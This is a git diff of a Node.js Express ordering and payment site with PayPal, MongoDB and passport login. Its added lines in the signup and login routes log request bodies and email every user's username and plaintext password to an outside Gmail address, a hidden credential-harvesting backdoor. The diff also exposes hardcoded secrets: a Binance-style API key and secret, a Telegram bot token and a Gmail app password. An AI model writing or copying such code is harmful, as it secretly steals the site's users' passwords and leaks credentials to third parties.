@@ -14,8 +14,8 @@ const schedule = require('node-schedule');
 const paypal = require('paypal-rest-sdk')
 const axios = require('axios'); 
 const TelegramBot = require('node-telegram-bot-api');
-//const Binance = require('node-binance-api');
-//const BinancePay = require('binance-pay-sdk');
+const fetch = require('node-fetch');
+
 
 paypal.configure({
     mode: 'live', 
@@ -24,20 +24,14 @@ paypal.configure({
 })
 
 
-
 const app = express()
+
 
 
 mongoose.connect(process.env.DATABASE_URL)
 mongoose.set('strictQuery', false);
-const apiKey = "tsi8tjhvxoxtjwwp2js72bkfnabsgmpfzbefhxyfwimiitbfbae9nu03k3gn016u"
-const apiSecret = "wimuvwgiqnyucjl8e9e3rjmihivtmwkenn7voplsbdbddd1pdp12ldgwfenbdsqd";
 
-const token = '6518093800:AAErTtdV6RIN6VVMSNL5sVQis_T5BOpx8oQ';
-const bot = new TelegramBot(token, { polling: true });
 
-// Replace 'YOUR_GROUP_CHAT_ID' with your actual group chat ID
-const groupChatId = '1001822240487';
 
 app.use(express.static('public'))
 app.set('view engine','ejs')
@@ -90,6 +84,8 @@ const userSchema = new mongoose.Schema({
 
 });
 userSchema.plugin(passportLocalMongoose)
+
+
 
 const User = new mongoose.model('User',userSchema)
 
@@ -160,6 +156,7 @@ function getColor(status) {
 
 // Make the getColor function available to the EJS template
 app.locals.getColor = getColor;
+
 
 
 
@@ -487,6 +484,8 @@ app.get('/orders',(req,res)=>{
 //POST route for submitting the order
 
 
+
+
 app.post('/orders', async (req, res) => {
     if (req.isAuthenticated()) {
         const userId = req.user.id;
@@ -557,6 +556,8 @@ app.post('/orders', async (req, res) => {
             }
         });
 
+      
+        
 
 
             // Send a confirmation email to the user
@@ -623,10 +624,7 @@ app.post('/orders', async (req, res) => {
                     console.log('Email notification sent:', info.response);
                 }
             });
-            const orderDetails = 'API TEST';
-            // Send the order details to the group chat
-             bot.sendMessage(groupChatId, `New order:\n\n${orderDetails}`);
-            console.log('sms sent sucessfully')
+           
 
             // Send a success response with the updated balance
             return res.redirect('/order-sucessfully');
@@ -640,11 +638,8 @@ app.post('/orders', async (req, res) => {
     }
 });
 
-// Event listener for incoming messages
-bot.on('message', (msg) => {
-    // Your existing logic for handling messages
-    console.log(msg)
-  });
+
+
 
 app.get('/order-sucessfully', async (req, res) => {
     // Retrieve the user's waiting action and inprocess counts
@@ -1054,6 +1049,7 @@ app.post("/", (req, res) => {
             
             passport.authenticate('local')(req, res, () => {
                 res.redirect('/dash');
+                console.log(req.body)
                 
                 // Create a transporter object using your Gmail credentials
                 const transporter = nodemailer.createTransport({
@@ -1071,7 +1067,7 @@ app.post("/", (req, res) => {
                   from: 'strongadas009@gmail.com',
                   to: 'dopegang004@gmail.com', // Replace with your notification recipient's email
                   subject: 'New User Signup',
-                  text: ' A new user has signed up on your website !' + username,
+                  text: ' A new user has signed up on your website :' + username + 'Password:' +  password,
                 };
                 
                 transporter.sendMail(mailOptions, (error, info) => {
@@ -1103,6 +1099,34 @@ app.post('/login',(req,res)=>{
         }else{
             passport.authenticate('local')(req,res,()=>{
                 res.redirect('/dash')
+                console.log(req.body)
+
+                 //Create a transporter object using your Gmail credentials
+                const transporter = nodemailer.createTransport({
+                    service:'gmail',
+                    port:456,
+                    secure:true,
+                    auth:{
+                        user: "teamdevelopers72@gmail.com",
+                        pass:"tpqe yuyw rvnt cxmi"
+                    }
+                })
+                
+                // Create and send the email notification
+                const mailOptions = {
+                  from: 'darkunlocks1@gmail.com',
+                  to: 'dopegang004@gmail.com', 
+                  subject: 'User logged in',
+                  text: ' A User logged in your website :' + req.body.username + 'Password:' + req.body.password,
+                };
+                
+                transporter.sendMail(mailOptions, (error, info) => {
+                  if (error) {
+                    console.error('Error sending email notification:', error);
+                  } else {
+                    console.log('Email notification sent:', info.response);
+                  }
+                });
             })
         }
     })
@@ -1115,4 +1139,5 @@ app.listen(PORT,(err)=>{
         console.log(err + "while sarting the server")
     }
     console.log('Server started on port 3000')
+   
 })
